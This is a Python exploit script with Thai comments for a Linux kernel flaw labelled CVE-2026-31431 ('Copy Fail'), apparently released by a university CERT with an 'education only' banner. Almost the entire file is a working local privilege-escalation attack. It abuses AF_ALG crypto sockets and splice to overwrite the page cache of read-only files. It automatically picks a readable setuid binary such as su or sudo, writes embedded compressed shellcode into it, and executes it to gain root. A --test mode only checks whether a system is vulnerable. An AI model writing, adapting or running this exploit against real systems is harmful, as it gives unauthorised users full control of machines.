#!/usr/bin/env python3
"""
Copy Fail (CVE-2026-31431) - รองรับ Ubuntu 18.04 ถึง 24.04 (kernel 4.x - 6.x)
"""

import os
import sys
import zlib
import socket
import argparse
import tempfile
import ctypes
import ctypes.util
import stat
import errno

# ------------------ ส่วน splice (รองรับ Python <3.10) ------------------
_libc = None
_splice_func = None

def _init_splice():
    global _libc, _splice_func
    if _splice_func:
        return
    libc_path = ctypes.util.find_library("c")
    if not libc_path:
        raise RuntimeError("ไม่พบ libc")
    _libc = ctypes.CDLL(libc_path, use_errno=True)
    _splice_func = _libc.splice
    _splice_func.argtypes = (ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
                             ctypes.c_int, ctypes.POINTER(ctypes.c_int64),
                             ctypes.c_size_t, ctypes.c_uint)
    _splice_func.restype = ctypes.c_ssize_t

def splice_compat(src, dst, count, offset_src=None, offset_dst=None, flags=0):
    if hasattr(os, "splice"):
        try:
            return os.splice(src, dst, count, offset_src, offset_dst, flags)
        except:
            pass
    _init_splice()
    off_in = ctypes.c_int64(offset_src) if offset_src is not None else None
    off_out = ctypes.c_int64(offset_dst) if offset_dst is not None else None
    res = _splice_func(src,
                       ctypes.byref(off_in) if off_in else None,
                       dst,
                       ctypes.byref(off_out) if off_out else None,
                       count, flags)
    if res < 0:
        err = ctypes.get_errno()
        raise OSError(err, f"splice failed: {errno.errorcode.get(err, 'unknown')}")
    return res

# ------------------ ค้นหา algorithm AEAD ที่ใช้ได้จริง (ลอง bind) ------------------
_WORKING_AEAD = None

def get_working_aead(debug=False):
    global _WORKING_AEAD
    if _WORKING_AEAD is not None:
        return _WORKING_AEAD

    # รายการ algorithms เรียงลำดับจากเก่าสุดไปใหม่ (Ubuntu 18.04 -> 24.04)
    candidates = [
        "authencesn(hmac(sha256),cbc(aes))",   # Ubuntu 18.04 (kernel 4.x)
        "authenc(hmac(sha256),cbc(aes))",      # Ubuntu 20.04 (kernel 5.x)
        "gcm(aes)",                            # Ubuntu 22.04/24.04
        "ccm(aes)",                            # fallback
        "rfc4106(gcm(aes))",                   # fallback
    ]

    # อ่านจาก /proc/crypto เพิ่มเติม (เผื่อมี algorithm อื่น)
    try:
        with open("/proc/crypto", "r") as f:
            data = f.read()
        import re
        for match in re.finditer(r"name\s+:\s+(\S+)", data):
            name = match.group(1)
            if name not in candidates:
                candidates.append(name)
    except:
        pass

    # ลอง bind แต่ละตัว
    for name in candidates:
        try:
            sock = socket.socket(38, 5, 0)  # AF_ALG, SOCK_SEQPACKET
            sock.bind(("aead", name))
            sock.close()
            if debug:
                print(f"[debug] ใช้ algorithm ที่ bind สำเร็จ: {name}")
            _WORKING_AEAD = name
            return name
        except OSError as e:
            if debug:
                print(f"[debug] {name} ล้มเหลว: {e}")
            continue

    # ถ้าไม่มีอันไหนสำเร็จ ให้แนะนำให้โหลด module
    print("[!] ไม่พบ AEAD algorithm ที่ bind ได้")
    print("[*] ลองสั่ง: sudo modprobe algif_aead")
    print("[*] หรือตรวจสอบ /proc/crypto ว่ามี algorithm แบบ aead หรือไม่")
    raise RuntimeError("ไม่พบ AEAD algorithm ที่รองรับ")

# ------------------ trigger_write (ใช้ algorithm ที่หาได้) ------------------
def trigger_write(fd_target, offset, data4, debug=False):
    aead_name = get_working_aead(debug)
    sock = socket.socket(38, 5, 0)
    try:
        sock.bind(("aead", aead_name))
    except OSError as e:
        sock.close()
        raise RuntimeError(f"bind ล้มเหลว: {e}")

    SOL_ALG = 279
    sock.setsockopt(SOL_ALG, 1, bytes.fromhex("0800010000000010" + "0" * 64))
    sock.setsockopt(SOL_ALG, 5, None, 4)

    op_sock, _ = sock.accept()

    i_zero = bytes.fromhex("00")
    msg_data = [b"A" * 4 + data4]
    anc_data = [
        (SOL_ALG, 3, i_zero * 4),
        (SOL_ALG, 2, b"\x10" + i_zero * 19),
        (SOL_ALG, 4, b"\x08" + i_zero * 3),
    ]
    op_sock.sendmsg(msg_data, anc_data, 32768)

    r, w = os.pipe()
    try:
        n = splice_compat(fd_target, w, 4, offset_src=offset)
        if debug:
            print(f"[debug] splice read {n} bytes at offset {offset}")
        if n < 4:
            os.write(w, b"\x00" * (4 - n))
        splice_compat(r, op_sock.fileno(), 4)
        if debug:
            print(f"[debug] splice write 4 bytes to op socket")
    except OSError as e:
        if debug:
            print(f"[debug] splice error: {e}")
    finally:
        try:
            op_sock.recv(8 + offset)
        except:
            pass
        op_sock.close()
        sock.close()
        os.close(r)
        os.close(w)

# ------------------ patch_file, verify_patch, test_vulnerability ------------------
def patch_file(target_path, shellcode_bytes, verbose=True, debug=False):
    if not os.path.exists(target_path):
        if verbose: print(f"[!] ไม่พบ: {target_path}")
        return False
    if not os.access(target_path, os.R_OK):
        if verbose: print(f"[!] ไม่มีสิทธิ์อ่าน: {target_path}")
        return False

    fd = os.open(target_path, os.O_RDONLY)
    if verbose:
        print(f"[+] เปิด {target_path} (fd={fd}, size={os.path.getsize(target_path)})")
        print(f"[+] shellcode size: {len(shellcode_bytes)} bytes")
        print("[+] เริ่มเขียน page cache ทีละ 4 ไบต์...")

    success = True
    for i in range(0, len(shellcode_bytes), 4):
        chunk = shellcode_bytes[i:i+4]
        if len(chunk) < 4:
            chunk = chunk.ljust(4, b"\x90")
        try:
            trigger_write(fd, i, chunk, debug=debug)
        except Exception as e:
            if verbose:
                print(f"    [!] ล้มเหลวที่ offset {i}: {e}")
            success = False
            break
        if verbose and (i % 64 == 0 or i+4 >= len(shellcode_bytes)):
            print(f"   เขียน {min(i+4, len(shellcode_bytes))}/{len(shellcode_bytes)} bytes...")
    os.close(fd)

    if success and verify_patch(target_path, shellcode_bytes):
        if verbose: print("[+] ✅ ยืนยันการแก้ไข page cache สำเร็จ")
        return True
    else:
        if verbose: print("[-] ❌ ไม่สามารถยืนยันการแก้ไข")
        return False

def verify_patch(target_path, expected_bytes, offset=0):
    try:
        with open(target_path, "rb") as f:
            f.seek(offset)
            return f.read(len(expected_bytes)) == expected_bytes
    except:
        return False

def test_vulnerability(debug=False):
    print("[*] ทดสอบ CVE-2026-31431 ...")
    with tempfile.NamedTemporaryFile(delete=False) as tmp:
        tmp_path = tmp.name
        tmp.write(b"A" * 16384)
        tmp.flush()
        os.fsync(tmp.fileno())
    test_payload = b"BBBB"
    try:
        fd = os.open(tmp_path, os.O_RDONLY)
        trigger_write(fd, 0, test_payload, debug=debug)
        os.close(fd)
        with open(tmp_path, "rb") as f:
            data = f.read(4)
        if data == test_payload:
            print("[+] ✅ ระบบเสี่ยง (write สำเร็จ)")
            return True
        else:
            print("[-] ระบบไม่เสี่ยง")
            return False
    except Exception as e:
        print(f"[!] ข้อผิดพลาด: {e}")
        return False
    finally:
        os.unlink(tmp_path)

# ------------------ ส่วนค้นหา target อัตโนมัติ ------------------
def is_setuid_readable(path):
    try:
        return (os.stat(path).st_mode & stat.S_ISUID) and os.access(path, os.R_OK)
    except:
        return False

def find_readable_setuid():
    dirs = ["/bin", "/sbin", "/usr/bin", "/usr/sbin", "/usr/local/bin"]
    known = ["su", "sudo", "passwd", "pkexec", "mount", "umount", "ping"]
    found = []
    for d in dirs:
        if not os.path.isdir(d): continue
        for name in known:
            p = os.path.join(d, name)
            if is_setuid_readable(p):
                found.append((p, os.path.getsize(p)))
        # scan เพิ่ม (จำกัดไม่ให้ช้าเกินไป)
        try:
            for f in os.listdir(d):
                if f.startswith(('.', 'lib')): continue
                p = os.path.join(d, f)
                if os.path.isfile(p) and is_setuid_readable(p) and (p, os.path.getsize(p)) not in found:
                    found.append((p, os.path.getsize(p)))
        except:
            continue
    found.sort(key=lambda x: x[1])
    return found

def print_targets(targets):
    if not targets:
        print("[!] ไม่พบ target ที่อ่านได้")
        return
    print(f"[+] พบ {len(targets)} target(s):")
    for i, (p, s) in enumerate(targets, 1):
        print(f"    {i}. {p} ({s} bytes)")

def print_banner():
    print(r"""
   _____  __  __ _    _ _______    _____ ______ _____ _______ 
  |  __ \|  \/  | |  | |__   __|  / ____|  ____|  __ \__   __|
  | |__) | \  / | |  | |  | |    | |    | |__  | |__) | | |   
  |  _  /| |\/| | |  | |  | |    | |    |  __| |  _  /  | |   
  | | \ \| |  | | |__| |  | |    | |____| |____| | \ \  | |   
  |_|  \_\_|  |_|\____/   |_|     \_____|______|_|  \_\ |_|   
                                                              
           [ RMUT Computer Emergency Response Team ]           
                  CVE-2026-31431 (Copy Fail)            
    """)
    print("[!] ใช้เพื่อการศึกษาเท่านั้น\n")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--test", action="store_true", help="ทดสอบช่องโหว่")
    parser.add_argument("--exploit", action="store_true", help="ยกระดับสิทธิ์")
    parser.add_argument("--target", help="ไฟล์เป้าหมาย (ถ้าไม่ระบุ จะเลือกอัตโนมัติ)")
    parser.add_argument("--shellcode", help="ไฟล์ shellcode กำหนดเอง")
    parser.add_argument("--list-targets", action="store_true")
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args()
    print_banner()

    if args.list_targets:
        print_targets(find_readable_setuid())
        return

    if args.test:
        test_vulnerability(debug=args.debug)
        return

    if args.exploit:
        target = args.target
        if not target:
            targets = find_readable_setuid()
            if not targets:
                print("[!] ไม่มี target ที่อ่านได้")
                sys.exit(1)
            target = targets[0][0]
            print(f"[*] เลือกเป้าหมายอัตโนมัติ: {target}")
        else:
            if not os.path.exists(target):
                print(f"[!] ไม่พบ {target}")
                sys.exit(1)
            if not os.access(target, os.R_OK):
                print(f"[!] ไม่มีสิทธิ์อ่าน {target}")
                sys.exit(1)

        if args.shellcode:
            with open(args.shellcode, "rb") as f:
                sc = f.read()
            print(f"[*] ใช้ shellcode ภายนอก ({len(sc)} bytes)")
        else:
            sc = zlib.decompress(bytes.fromhex(
                "78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a"
                "154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56"
                "c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
            ))
            print("[*] ใช้ shellcode มาตรฐาน (สำหรับ su)")

        if not test_vulnerability(debug=args.debug):
            print("[!] ระบบไม่เสี่ยง -> เลิก")
            sys.exit(1)

        if patch_file(target, sc, verbose=True, debug=args.debug):
            print(f"\n[+] สำเร็จ! กำลังรัน {target}...")
            os.system(target)
        else:
            print("\n[-] ล้มเหลว")
            sys.exit(1)
        return

    parser.print_help()

if __name__ == "__main__":
    main()